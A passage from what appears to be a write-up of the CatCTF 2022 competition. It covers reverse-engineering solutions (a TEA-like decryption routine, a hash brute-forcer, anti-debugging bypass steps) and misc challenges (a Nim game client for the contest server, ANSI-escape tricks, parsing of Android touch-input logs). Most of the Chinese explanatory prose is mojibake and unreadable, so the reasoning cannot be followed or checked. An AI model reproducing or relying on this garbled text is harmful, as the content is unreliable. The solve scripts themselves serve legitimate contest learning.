0xAA, 0x7D, 0x07, 0x7D, 0xB1, 0xF7, 0x80, 0x71, 0xDA, 0xAF, 0x23, 0xE5, 0x10, 0x07, 0x58, 0x57, 0x1E, 0xF7, 0x7D, 0x71, 0xE6, 0x78, 0x74, 0x56, 0x9B, 0xC0, 0x53, 0x11, 0xF3, 0x39, 0x31, 0x2E
};
unsigned int key[4] = { 0x18bc8a17, 0x29d3ce1e, 0x42f740e3, 0x199c7f4a};

void decrypt (DWORD* v, DWORD* k) {  
    DWORD round = 28;
    DWORD delta=0xCA7C7F00;    

    DWORD v0=v[0], v1=v[1], sum=delta*round, i; 
    DWORD k0=k[0], k1=k[1], k2=k[2], k3=k[3];  
    for (i=0; i<round; i++) { 
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);  
        sum -= delta;  
    }                              
    v[0]=v0; v[1]=v1;  
}  

int main() {

    for(int i=0;i<sizeof(data)/8;++i)
        decrypt(&reinterpret_cast<union data*>(ciphers)->data[2*i], reinterpret_cast<DWORD*>(key));

    for(int i=0;i<sizeof(data);++i)
        printf("0x%02X, ", reinterpret_cast<union data*>(ciphers)->raw[i]);
    printf("\n");

    // Part2
    for(int i=30;i>=0;--i)
        ciphers[i] ^= ciphers[i+1];

    for(int i=0;i<sizeof(data);++i)
        printf("%c", reinterpret_cast<union data*>(ciphers)->raw[i]);
    printf("\n");

    return 0;
}
```

### StupidOrangeCat2&#xD;

é“¾æ¥ï¼š[https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7](https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7 "https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7")
æå–ç ï¼š21g7
\--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº«

### The cat did it

#### è®¾è®¡æ€è·¯å’Œè§£æ³•

è¿™é‡Œå…ˆç»™å¸ˆå‚…ä»¬ç£•å¤´äº†

![](Nepnep-CatCTF2022/image_35swh0x-KO.png)

å¯èƒ½å¾ˆå¤šå¸ˆå‚…æ²¡æœ‰çœ‹æ‡‚è¿™ä¸ªé¢˜ç›®çš„æ„æ€ï¼Œç›´æ¥çŒœå‡ºäº†æ¦‚ç‡ä¸º0%ï¼ˆå…¶å®è¿™æ˜¯ä¿®æ”¹åçš„ï¼Œä¿®æ”¹å‰å¯èƒ½æ›´çœ‹ä¸æ‡‚ [https://www.desmos.com/calculator/wzuskcjd34](https://www.desmos.com/calculator/wzuskcjd34?lang=zh-CN "https://www.desmos.com/calculator/wzuskcjd34")

æœ¬é¢˜æ˜¯æˆ‘åœ¨å­¦ä¹ æ¦‚ç‡è®ºæ—¶å‡ºçš„ï¼Œä¸è¿‡è¿™é‡Œä½œä¸ºç­¾åˆ°é¢˜ç›®å‡å»äº†å¤æ‚çš„è®¡ç®—åªéœ€è¦ç¨å¾®çš„åˆ†æä¸€ä¸‹å°±å¯ä»¥äº†ã€‚

è¿™é‡Œâ€œäººâ€åœ¨æ­£æ€åˆ†æ­¥çš„å‡½æ•°å›¾åƒä¸Šè¡Œèµ°ï¼Œï¼ˆè¿™é‡Œæ˜¯é‡‡ç”¨äº†ä¸­å¿ƒæé™å®šç†ï¼Œäººæ•°åº”è¯¥å¤Ÿäº†ğŸ˜¶ï¼‰è€Œå‡½æ•°ç»™åˆ°çš„å®šä¹‰åŸŸåœ¨\`-200ä¹‹é—´ï¼ŒçŒ«çŒ«çš„å®šä¹‰åŸŸåŒ…å«æ­£æ€å‡½æ•°çš„å®šä¹‰åŸŸçš„ã€‚

![](Nepnep-CatCTF2022/image-1672646385574_TMufCm2CkE.png)

é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œæœ‰æ¦‚ç‡å¯†åº¦æ±‚åœ¨xåœ¨çŒ«çŒ«æ¨ªåæ ‡ä¹‹å¤–çš„æ¦‚ç‡ã€‚ç”±äºåªç»™äº†+-200ä¹‹é—´ï¼Œä¹‹é—´çš„å¤šä½™æ²¡æœ‰ç»™ï¼Œå¯¹ç«‹æ±‚ä¸€ä¸ªå¤§çº¦çš„æ¦‚ç‡ä¸º

$$
P = \lfloor1 - (\Phi(\frac {200-b}a) - \Phi(\frac {-200-b}a)) \rfloor= \lfloor 1-(1-2\Phi(\frac {-200-b}a)) \rfloor=\lfloor2\Phi(\frac {-200-b}a)\rfloor
$$

å¯ä»¥å¾—åˆ°æ¦‚ç‡ä¸º0%

#### çŒ«çŒ«é•‡æ¥¼

å¯èƒ½è®©å¸ˆå‚…ä»¬åšçš„äº‘é‡Œé›¾é‡Œçš„ï¼Œå†æ¬¡ç£•å¤´äº†ï¼Œæ•´æˆçƒ‚æ´»äº†ã€‚

![](Nepnep-CatCTF2022/Cat_nlZQ234xAu.jpg)

å…¶å®è¿™é‡Œé¢æœ‰BGMçš„

[spaces%252FfgjZFp4NZA2UpGnWN2k8%252Fuploads%252FwjX2bQFO6aTRM30TAoPc%252Fmusic.mp4](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%252FfgjZFp4NZA2UpGnWN2k8%252Fuploads%252FwjX2bQFO6aTRM30TAoPc%252Fmusic.mp4?alt=media\&token=15f34bd9-1187-4fb2-84c0-79646626c92a)

### BugCat

#### ä¸€ã€å‰è¨€

è¿™é‡Œç»™å‡ºçš„æ˜¯ä¸€ä¸ªé¢„è®¾è§£ï¼Œè¿™ä¸ªè§£æ³•å¯èƒ½ä¸ä¼šæ˜¯ç¬¬ä¸€æ¬¡åˆ†æè¯¥é¢˜å°±å¯ä»¥è”æƒ³åˆ°çš„ï¼Œä¸è¿‡å´æ˜¯è§£é¢˜æœ€å¿«çš„æ€è·¯ï¼Œç”±äºè¯¦ç»†çš„æ€è·¯æ¶‰åŠåˆ°å‡ºé¢˜ç›¸å…³çš„ç»†èŠ‚ï¼Œè€Œä¸”åŒ…å«è®¸å¤šå‰ç½®çŸ¥è¯†ç‚¹ï¼Œä¼šåœ¨åæœŸæ›´æ–°åˆ°å¦‚ä¸‹ä¸“æ ä¸­ï¼Œå¹¶ç»™å‡ºä»é€‰æ‰‹è§’åº¦æ¥è¯´çš„é¢„æœŸæ”»å‡»æ–¹æ¡ˆä»¥åŠä»å‡ºé¢˜äººè§’åº¦å¯¹é¢˜ç›®çš„ä¸€äº›åˆ†æ

[å‡ºé¢˜å°è®°](https://www.bilibili.com/read/readlist/rl656546 "å‡ºé¢˜å°è®°")

#### äºŒã€è§£é¢˜æ–¹æ¡ˆ

æ‰“å¼€ç¨‹åºï¼Œè¢«è¦æ±‚è¾“å…¥ç‰¹å®šå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ç®€å•åˆ†æå¯å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯

1.  è¾“å…¥å†…å®¹ä¸º**flag{xxxxxxxxxxxxxxxxxxxxxxxx}**ï¼Œé•¿åº¦ä¸º30
2.  ä»£ç å†…å¤¹æ‚ç€å¤§é‡èŠ±æŒ‡ä»¤
3.  ä»£ç æ³¨å†Œäº†VEHå¼‚å¸¸å›è°ƒï¼Œå¹¶åœ¨å…¶ä¸­å¸ƒç½®äº†4ä¸ªç¡¬ä»¶æ–­ç‚¹ä¸”ä¼šåœ¨ç‰¹å®šæƒ…å†µä¸‹ä¿®æ”¹å¯„å­˜å™¨çš„å€¼
4.  ä¸»ä½“ä»£ç æ²¡æœ‰èŠ±æŒ‡ä»¤ï¼Œéå¸¸æ¸…æ™°ï¼Œæ˜¯å¯¹flagæ‹¬å·å†…çš„å†…å®¹è¿›è¡Œhashcodeï¼Œç„¶åä¸å†…ç½®å€¼æ¯”è¾ƒ

æˆ‘ä»¬é¦–å…ˆåˆ†æä¸»ä½“ä»£ç ï¼Œä¼šå‘ç°å¦‚æœæŒ‰è¿™ä¸ªé€»è¾‘è®¡ç®—hashcodeï¼Œå¿…ç„¶å­˜åœ¨å¤šè§£ï¼Œæ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥ï¼Œç®—æ³•å­˜åœ¨BUGï¼Œé‚£ä¹ˆæ³¨å†Œçš„å¼‚å¸¸å¤„ç†éƒ¨åˆ†åº”è¯¥å°±æ˜¯è´Ÿè´£ä¿®å¤BUGçš„å­˜åœ¨

è¿™é‡Œæˆ‘ä»¬é™„åŠ ç¨‹åºï¼Œå¤„ç†æ‰**ZwSetInformationThread**å‡½æ•°ï¼Œç„¶åä¿®æ”¹**ZwCreateThreadEx**å‡½æ•°çš„Flagså‚æ•°ä¸º2(è·³è¿‡TLSå›è°ƒ)ï¼Œä¹‹ååœ¨ä¸»ä½“ä»£ç int2dæŒ‡ä»¤åçš„ä»£ç å¤„ä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿè°ƒè¯•å¯„å­˜å™¨ï¼Œå¾—åˆ°å››ä¸ªç¡¬ä»¶æ–­ç‚¹çš„ä½ç½®ï¼Œä¹‹ååˆ†åˆ«åœ¨ç›¸åº”ç¡¬ä»¶æ–­ç‚¹æ‰€å¯¹åº”ä»£ç å‰åä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•æ‰§è¡Œï¼Œæ ¹æ®å‰åå¯„å­˜å™¨çš„å˜åŒ–ä»¥åŠè¢«ä¸‹æ–­ç‚¹çš„ä»£ç çš„åŸå§‹ä½œç”¨å¯ä»¥å¾—å‡ºä»¥ä¸‹ä¿¡æ¯

1.  flagå†…çš„å†…å®¹è¢«å››ä¸ªä¸€ç»„è¿›è¡Œhashcodeçš„è®¡ç®—
2.  ä¹˜å­çš„å€¼ä¸º257
3.  æ¯æ¬¡hashå¼‚æˆ–çš„å€¼ä¼šæ ¹æ®å¯ç”¨æ–­ç‚¹ä½ç½®åŠæ•°é‡çš„ä¸åŒè€Œå˜åŒ–ï¼Œè€ƒè™‘åˆ°æ˜¯CRCçš„æ ¡éªŒå€¼
4.  æ­£ç¡®çš„flagè®¡ç®—ç»“æœåº”è¯¥ä»å†…ç½®çš„æ•°ç»„ä¸‹æ ‡(ä»0å¼€å§‹)2å¤„è¯»å–

å¯¹äºå¯»æ‰¾CRCæ ¡éªŒï¼Œæˆ‘ä»¬åœ¨å¯ä»¥GetModuleHandleAä¸‹æ–­ç‚¹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€å¤„è¢«åŠ äº†å¤§é‡èŠ±æŒ‡ä»¤çš„ä»£ç ï¼Œç®€å•åˆ†æå¯ä»¥çŸ¥é“è¿™é‡Œæ˜¯ä¸€å¤„crcæ ¡éªŒç”¨ä»£ç ï¼Œè¿™é‡Œç›´æ¥é‡æ–°è½½å…¥ç¨‹åºï¼Œé‡è®¾EIPåˆ°CRCæ ¡éªŒå¤„ï¼Œåœ¨ntdll.LdrxCallInitRoutineçš„è¿”å›å¤„ä¸‹æ–­ç‚¹ï¼Œå³å¯å¾—åˆ°æ­£ç¡®çš„CRCæ ¡éªŒå€¼

è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†è§£é¢˜æ‰€éœ€è¦çš„æ‰€æœ‰æ•°æ®ï¼Œå†™ä¸ªè„šæœ¬çˆ†ç ´å‡ºflagå³å¯

#### ä¸‰ã€è§£é¢˜è„šæœ¬

æœ€ç»ˆè§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼Œå¤§çº¦åœ¨2åˆ†é’Ÿå†…å³å¯çˆ†ç ´å‡ºæ­£ç¡®çš„flag

**flag{bu9CAT+C\@P0o-1S\_s0-CUTe\~}**

```python
hashTable = [0x66BF1BAC, 0x473AC6FC, 0x4433C0D0, 0x289B6CEF, 0x71A8B6EC, 0x53775C73]
flag = []
for i in range(len(hashTable)):
    flag.append(b"")
for i1 in range(94):
    str1 = chr(i1 + 33)
    for i2 in range(94):
        str2 = chr(i2 + 33)
        for i3 in range(94):
            str3 = chr(i3 + 33)
            for i4 in range(94):
                str4 = chr(i4 + 33)
                hash = 0
                finalStr = (str1 + str2 + str3 + str4).encode()
                for every_char in finalStr:
                    hash = 257 * hash + every_char
                hash ^= 0x052251FF
                if hash in hashTable:
                    flag[hashTable.index(hash)] = finalStr
print(b"".join(flag))
```

## MISC

### catnim

nimåšå¼ˆè€Œå·²ï¼Œæœ‰å…´è¶£å¯ä»¥äº†è§£å…·ä½“çš„åšå¼ˆæ€è·¯ä»¥åŠé€‰æ‹©çš„æ€è·¯ï¼Œåªéœ€è¦ç¡®ä¿æˆ‘æ‹¿èµ°çš„æ—¶å€™æ‰€æœ‰çŸ³å¤´çš„å¼‚æˆ–å’Œä¸º0å³å¯ã€‚

#### exp

```python
from pwn import *
#context.log_level='debug'
def get_pile():
    p.recvuntil('Now pile: ')
    line=p.recvline()[:-1].decode()
    return line.split(' ')
def get_xor(piles):
    v=0
    for num in piles:
        v^=num
    print("xor :",v)
    return v
def choose(piles):
    v=get_xor(piles)
    i=0
    for num in piles:
        if num-(num^v) > 0:
            return i,num-(num^v)
        i+=1
    return None,None
p=remote('223.112.5.156',55068)
p.sendline('N')
start=time.time()
while True:
    piles=get_pile()
    pilesnum=[int(i) for i in piles]
    where,cnt=choose(pilesnum)
    print(pilesnum)
    s=0
    for num in pilesnum:
        if num==0:
            s+=1
    p.sendlineafter('where:',str(where))
    p.sendlineafter('count:',str(cnt))
    if s==len(pilesnum)-1:
        break
    piles=get_pile()
print(time.time()-start)
p.interactive()
#print(pilesnum)


p.interactive()
```

### miao\~

ä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€ä¸ªå«æœ‰éŸ³é¢‘æ–‡ä»¶çš„å›¾ç‰‡

åˆ†ç¦»å‡ºæ¥ä¸€ä¸ªwavï¼Œé€šè¿‡æ”¹å˜é¢‘è°±å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªCatCTFçš„å­—æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªå¯†ç 

å¯ä»¥å°è¯•å…³äºwavçš„éšå†™ï¼Œæ˜¯deepsoundï¼Œä½¿ç”¨å·¥å…·åŠ è½½æ–‡ä»¶ï¼Œæç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œé‚£ä¹ˆå¯†ç å°±æ˜¯CatCTF

å¾—åˆ°flag.txtæ–‡ä»¶ï¼Œé‡Œé¢æœ‰å–µå‘œçš„å­—æ ·ï¼ŒçŒœæµ‹æ˜¯å…½è¯­ï¼Œæœç´¢å…½è¯­ç¿»è¯‘å™¨[å…½éŸ³è¯‘è€…åœ¨çº¿ç¼–ç è§£ç  - å…½éŸ³ç¿»è¯‘å’†å“®ä½“åŠ å¯†è§£å¯† (iiilab.com)](https://roar.iiilab.com/ "å…½éŸ³è¯‘è€…åœ¨çº¿ç¼–ç è§£ç  - å…½éŸ³ç¿»è¯‘å’†å“®ä½“åŠ å¯†è§£å¯† (iiilab.com)")

å¾—åˆ°æœ€åflag

CatCTF{d0\_y0u\_Hate\_c4t\_ba3k1ng *?* M1ao\~}

### Peekaboo

èº²çŒ«çŒ«ï¼Œé¢„æœŸè§£æ˜¯ä¸€ä¸ªosinté¢˜ç›®

é€šè¿‡é™„ä»¶å‘ç°æ°´å°ï¼Œæ˜¯ä¸€ä¸ªqqç©ºé—´ï¼Œæ‰¾åˆ°ç©ºé—´åå‘ç°æœ‰å¾ˆå¤šäºŒç»´ç ï¼ˆæˆ–è€…è¯´æ±‰ä¿¡ç ï¼‰

æ‰«ä¸€ä¸‹å‘ç°å”¯ä¸€æœ‰ç”¨çš„çº¿ç´¢ï¼šsina.å…”`*****`52258

æœç´¢å¾®åšç”¨æˆ·å…”52258å¯ä»¥æ‰¾åˆ°æœ‰å…³flagçš„ä¿¡æ¯

æ‰¾åˆ°ç”¨æˆ·çš„ç‹è€…è´¦å·ï¼Œç‹è€…è¥åœ°æœç´¢å¯¹åº”è´¦å·å¾—åˆ°æœ¬èµ›å­£åªä½¿ç”¨äº†ä¸€ä¸ªè‹±é›„ï¼šç™¾é‡Œç„ç­–

CatCTF{bailixuance}

### MeowMeow

010æ‰“å¼€ç›´æ¥çœ‹ç­”æ¡ˆ

CatCTF{CAT\_GOES\_MEOW}

![](Nepnep-CatCTF2022/image_goDEqWj_50.png)

### CatFlag

åªæœ‰CatCTFæ‰èƒ½å‡ºCatéƒ½ä¼šæ‹¿çš„flag

`cat flag`ï¼Œå°±èƒ½é€šè¿‡çŒ«çŒ«æ‹¿åˆ°flagäº†

![](Nepnep-CatCTF2022/2023-01-03-00-33-09_rHRFbFYYAp.png)

Windowsä¸‹PowerShellä¹Ÿèƒ½é€šè¿‡çŒ«çŒ«æ‹¿flag

![](Nepnep-CatCTF2022/2023-01-03-00-34-11_rI5qqMDazg.png)

Windowsä¸‹cmdå¯ä»¥æ‰“å­—å‡ºflag `type flag`

![](Nepnep-CatCTF2022/2023-01-03-00-37-22_CAgQXDRFRA.png)

~~ä»€ä¹ˆï¼Ÿä½ è¦é€šè¿‡è®°äº‹æœ¬vim010Editoræ‹¿flag? ç³Šä½ çŒ«è„¸.png~~

æœ‰éƒ¨åˆ†é€‰æ‰‹å…ˆ`strings flag`ï¼Œè¯·ä¸è¦è¿™æ ·åš

PS1ï¼šå‡ºé¢˜åŸç†

`ANSI escape code`

[https://en.wikipedia.org/wiki/ANSI\_escape\_code](https://en.wikipedia.org/wiki/ANSI_escape_code "https://en.wikipedia.org/wiki/ANSI_escape_code")

æ§åˆ¶å…‰æ ‡çš„ç§»åŠ¨ï¼Œè¾“å‡ºéšæœºå­—ç¬¦ï¼Œè¾“å‡ºçš„é‡è¶³å¤Ÿå¤šå°±ä¼šæœ‰åŠ¨æ€æ•ˆæœ

```python
FILE = open("flag",'wb')
def writeThings(b):
    FILE.write(b)

def MoveLeft(n=1):
    writeThings(b'\x1b[C'*n)
    
def MoveRight(n=1):
    writeThings(b'\x1b[D'*n)

FLAG = b' CatCTF{!2023_Will_Be_Special,2022_Was_Not!} '
#flagå½©è›‹ï¼šhttps://thwiki.cc/%E6%98%8E%E6%97%A5%E4%B9%8B%E7%9B%9B%EF%BC%8C%E6%98%A8%E6%97%A5%E4%B9%8B%E4%BF%97
import random
COUNT = 2022234
randpos=[random.randint(0,len(FLAG)-1) for _ in range(COUNT)]
randchar = [random.randint(0x20,0x7e) for _ in range(COUNT)]
# adjust char

for i in range(len(FLAG)):
    pos = COUNT
    for j in range(COUNT-1,0,-1):
        if(randpos[j] == i):
            pos = j
            break
    randchar[pos] = FLAG[i]
    
writeThings(b'\n')
POS = 0
for i in range(COUNT):
    if(randpos[i] > POS):
        MoveLeft(randpos[i]-POS)
    elif(randpos[i] < POS):
        MoveRight(POS-randpos[i])
    writeThings(bytearray([randchar[i]]))
    POS = randpos[i]+1

writeThings(b'\n')

```

PS2ï¼šå½©è›‹

![](Nepnep-CatCTF2022/2023-01-03-00-45-27_sbSpLUOrWH.png)

### CatPaw

è¿™æ˜¯ä½œä¸ºMiscçš„å‹è½´é¢˜å‡ºçš„ï¼Œéš¾åº¦è¾ƒå¤§ï¼ˆLunaticï¼‰

åˆ†ææ–‡ä»¶ï¼Œè§‚å¯Ÿåˆ°æ˜¯å°ç±³æ‰‹æœºçš„å¤‡ä»½æ–‡ä»¶ï¼Œå®é™…ä¹Ÿæ˜¯ANDROID BACKUPæ–‡ä»¶ï¼Œå»æ‰å°ç±³çš„header

![](Nepnep-CatCTF2022/2022-12-09-15-41-35_KUIi2qunIN.png)

[https://github.com/nelenkov/android-backup-extractor](https://github.com/nelenkov/android-backup-extractor "https://github.com/nelenkov/android-backup-extractor") è§£å‹

![](Nepnep-CatCTF2022/2022-12-09-15-40-49_35ThyeGMD8.png)

åˆ†æapk ï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„å¯†ç md5 hashæ˜¯8b9b0ad9c324204fac87ae0fc2c630bd

![](Nepnep-CatCTF2022/2022-12-09-15-57-01_YNiepPfq5y.png)

åˆ†ælibå‡½æ•°ï¼Œå‘ç°æ²¡æœ‰å®é™…çš„è°ƒç”¨ï¼Œæœ‰å‡½æ•° æ‰“å¼€å¹¶è¯»å–æ–‡ä»¶ "/dev/input/event1" åˆ°è‡ªå·±çš„ç›®å½•ä¸‹

![](Nepnep-CatCTF2022/2022-12-09-15-58-47_iaBPkH1zzp.png)

åˆ†æ ef/1666666666 å‘ç°ç»“æ„æ˜¯24byte å¯¹é½

![](Nepnep-CatCTF2022/2022-12-09-16-07-15_G0DByG2R2Y.png)

æå‡ºæ‰€æœ‰æ•°æ®ï¼Œç»“åˆevent structç»“æ„ä½“ï¼Œå¤§è‡´çŒœæµ‹

![](Nepnep-CatCTF2022/2023-01-02-22-05-18_d9WvakdFF2.png)

53ï¼Œ54å¯¹åº”Xï¼ŒYï¼Œ58ä¸”å€¼ä¸º1000ä¸ºæŒ‰ä¸‹ï¼Œæå‡ºæ‰€æœ‰çš„æŒ‰é”®

è¿™é‡Œæœ‰é€‰æ‰‹ç¿»åˆ°äº†kernelåº•å±‚æºç è§£æeventç»“æ„ä½“

[https://www.kernel.org/doc/Documentation/input/input.txt](https://www.kernel.org/doc/Documentation/input/input.txt "https://www.kernel.org/doc/Documentation/input/input.txt")

[https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/input-event-codes.h")

è¾“å…¥å¯†ç æ—¶éƒ½ä¼šå¼¹å‡ºå®‰å…¨é”®ç›˜ï¼Œå› ä¸ºæ˜¯å°ç±³çš„å¤‡ä»½æ–‡ä»¶ï¼Œå¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜å¸ƒå±€ï¼Œèƒ½æ‰¾åˆ°ä¸€ä¸ª

![](Nepnep-CatCTF2022/keyboard_obml2LP1Jv.png)

```python
import struct
from PIL import Image, ImageDraw, ImageFont 

image = Image.new("RGB", (1080, 2200), "#00000000")
image =Image.open("keyboard.png")
draw = ImageDraw.Draw(image)
def drawText(x,y,text):
    draw.text((x,y+100),text,(0,0,255),text_size = 20)

def cropImage(x,y,id):
    y=y+100
    S = 50
    xa = x - S
    ya = y - S
    xb = x + S
    yb = y + S
    if(xa < 0):
        xb -= xa
        xa = 0
    elif(xb > 1080):
        xa -= (xb-1080)
        xb = 1080
    if(ya < 0):
        yb -= ya
        ya = 0
    elif(yb > 2200):
        ya -= (yb - 2200)
        yb = 2200
    crop = image.crop((xa,ya,xb,yb))
    crop.save("./keys/%d.png"%id)

with open("1666666666","rb") as f:
    data = f.read()


offset = 0
X = 0
Y = 0
count = 0
while(offset < len(data)):
    result = struct.unpack_from("<QQHHi",data,offset)
    offset += struct.calcsize("<QQHHi")
    # 53 X 54 Y
    if(result[3] == 58 and result[4] == 1000):
        count += 1
        #drawText(X,Y,str(count))
        cropImage(X,Y,count)
        print()
    if(result[3] == 53):
        print('X',result[4],end=' ')
        X = result[4]
    if(result[3] == 54):
        print('Y',result[4],end=' ')
        Y = result[4]
        
image.save("./test.png")
```

![](Nepnep-CatCTF2022/2022-12-15-00-56-08_YYxnivMVZg.png)

å‘ç°ä¼šè¾“å…¥ç¬¦å·ï¼Œå¤§å°å†™ï¼Œå®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€æ€ä¹ˆæ?

å¤§å°å†™å¯ä»¥è§‚å¯ŸCatCTFçš„è¾“å…¥ï¼Œè¾“å…¥å­—æ¯æ—¶Shiftä¸ä¼šç­ï¼Œæœ‰2ä½é€‰æ‰‹æœ€åå¡åœ¨äº†è¿™é‡Œï¼Œ

`CatCTF{the_C4t_!5_REc0rdiN9_$cr34n_by_inPUt_evEN7}`

æ²¡æœ‰åˆ†ææ¸…æ¥šå¤§å°å†™è§„å¾‹ï¼Œé—æ†¾

#### 1. æ‹¥æœ‰å°ç±³æ‰‹æœºï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¬¦å·å¸ƒå±€

æ°å¥½æœ‰å°ç±³æ‰‹æœºç¡®å®å¯ä»¥å·é¸¡

#### 2.å¯»æ‰¾å°ç±³å®‰å…¨é”®ç›˜çš„ç¬¦å·å¸ƒå±€

æ²¡æœ‰å°ç±³æ‰‹æœºå¥½åƒå¾ˆéš¾çš„æ ·å­ï¼Œå‡ºé¢˜äººæ²¡æ‰¾åˆ°

#### 3.åˆç†çŒœæµ‹

ç¬¦å·p å‡ºç°æ¬¡æ•°å¾ˆå¤šï¼ŒçŒœæµ‹ \_

`CatCTF{the_C4t_ 5_Rec0rdiN9_ cr33n_by_inPut_evEn7}`

å‘ç°åªå·®2ä¸ªï¼Œçˆ†ç ´md5å°±èƒ½å‡ºäº† æˆ–è€…æ ¹æ®è¯­ä¹‰æ¨æµ‹å‡º ! \$

`CatCTF{the_C4t_!5_Rec0rdiN9_$cr33n_by_inPut_evEn7}`

#### 4.é‡æ”¾?

æœªæ›¾è®¾æƒ³çš„é“è·¯ï¼Œå†™å…¥åˆ° /dev/input/event1 åº”è¯¥å¯è¡Œ?

è¦æ±‚å°ç±³ä¸”åŒå‹å·åŒå±å¹•å¤§å°æ‰‹æœºï¼Œå¾ˆéš¾çš„è¾£ï¼Œä¸è¿‡ç¡®å®æœ‰é€‰æ‰‹å°è¯•äº†ï¼Œå¹¶ä¸”æ‰“å‡ºäº†CatC

ç„¶åæç¤ºinvalid argument

çŒœæµ‹æ˜¯ä¸€æ¬¡æ•°æ®å¤ªå¤šï¼Œå»ºè®®å°è¯•ä¸‹åˆ†æ®µå†™å…¥

ï¼ˆç„¶åè¿™åé€‰æ‰‹äº‹åé€šè¿‡è¯»å–æ•°æ®adb shell inputé‡æ”¾äº†ï¼Œä¹Ÿæ˜¯å‰å®³ï¼‰

ä¹Ÿæœ‰é€‰æ‰‹å°è¯•åœ¨æ¨¡æ‹Ÿå™¨ä¸Šé‡æ”¾ï¼Œå‡ºç°äº†é”™è¯¯ï¼Œå…·ä½“åŸå› æœªéªŒè¯

### CatJump

#### å‰è¨€

å‡ºé¢˜5å¤©ï¼Œè¢«ç§’åŠå°æ—¶ï¼Œå½“æ—¶åšç¯å¢ƒçš„æ—¶å€™æ•°æ®å¿˜äº†æ¸…å¹²å‡€ï¼Œå¯¼è‡´è¢«éé¢„æœŸäº†ï¼ŒåŸæœ¬æŒºæœ‰è¶£çš„é¢˜ç›®æ²¡å¤šå°‘äººç©åˆ°ã€‚ æ„Ÿå…´è¶£çš„å¸ˆå‚…åç»­ä¹Ÿå¯ä»¥è¯•è¯•åŸæœ‰çš„è§£é¢˜æ€è·¯ï¼Œå¸Œæœ›å¯ä»¥ç»™å„ä½æœ‰äº›å¸®åŠ©ã€‚

#### å‡ºé¢˜çµæ„Ÿæ¥æº

1.  ä¸€ç›´åœ¨ç©é»‘è‹¹æœï¼Œè™½ç„¶11ä»£intelå·²ç»æ˜¯é»‘æœçš„ç»å”±äº†ï¼Œä½†ä¸­é—´çš„ä¸€äº›æ€è·¯å€’æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚
2.  å®‰è£…é»‘æœçš„é‡ç‚¹å°±åœ¨äºç¡¬ä»¶èƒ½å¦è¢«è‹¹æœç³»ç»Ÿè¯†åˆ«ï¼Œå› æ­¤å°±æœ‰äº†æœ¬é¢˜ï¼Œå¤§è‡´å°±æ˜¯é€šè¿‡æ£€æµ‹ç³»ç»Ÿçš„ç¡¬ä»¶é…ç½®ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„macOSæ£€æµ‹æœºåˆ¶ã€‚
3.  é€‰æ‰‹éœ€è¦é€šè¿‡ocæˆ–è€…å…¶ä»–æ–¹å¼ä¿®æ”¹nvramä¸­çš„å†…å®¹ï¼Œè®©ç¨‹åºè¯†åˆ«åˆ°è¯¥ç³»ç»Ÿçš„æŸäº›é…ç½®ã€‚

#### æ­£æ–‡

å½“æ—¶é¢„è®¾äº†2ç§è§£é¢˜æ–¹å¼

#### è§£é¢˜æ€è·¯1

1.  æ‹¿vmdkæ–‡ä»¶ï¼Œæå–å…¶ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆé”å®šopensslè§£å¯†çš„éƒ¨åˆ†ï¼Œåˆ©ç”¨é¢˜ç›®æè¿°ä¸­çš„ã€Œcat\_jumpã€è¿›è¡Œè§£å¯†è·å¾—flagã€‚

#### è§£é¢˜æ€è·¯2

æ‹¿åˆ°vmdkï¼Œè¿›è¡Œä»¿çœŸæŒ‚è½½ï¼Œä½†å‘ç°è¯¥ç£ç›˜æ— æ³•åœ¨ubuntuç­‰é¢„è®¾ä¸­è¿›è¡ŒæŒ‚è½½ï¼Œå› ä¸ºè¿™é‡Œç”¨çš„æ˜¯Alpine Linuxï¼Œå¹¶ä¸”æ˜¯Alpineæ˜¯UEFIï¼ŒVmwareä¸­ä¸€èˆ¬éƒ½æ˜¯bioså¼•å¯¼å¯åŠ¨ï¼Œå¦‚æœæ˜¯vmware workstationçš„è¯éœ€è¦åœ¨åˆ›å»ºå®Œæ¯•åï¼Œé«˜çº§ä¸­è®¾ç½®ä¸ºUEFIå¯åŠ¨ï¼Œå³å¯è¿›å…¥æ¸¸æˆã€‚

![](Nepnep-CatCTF2022/16727257912564_M53gte1GHd.jpg)

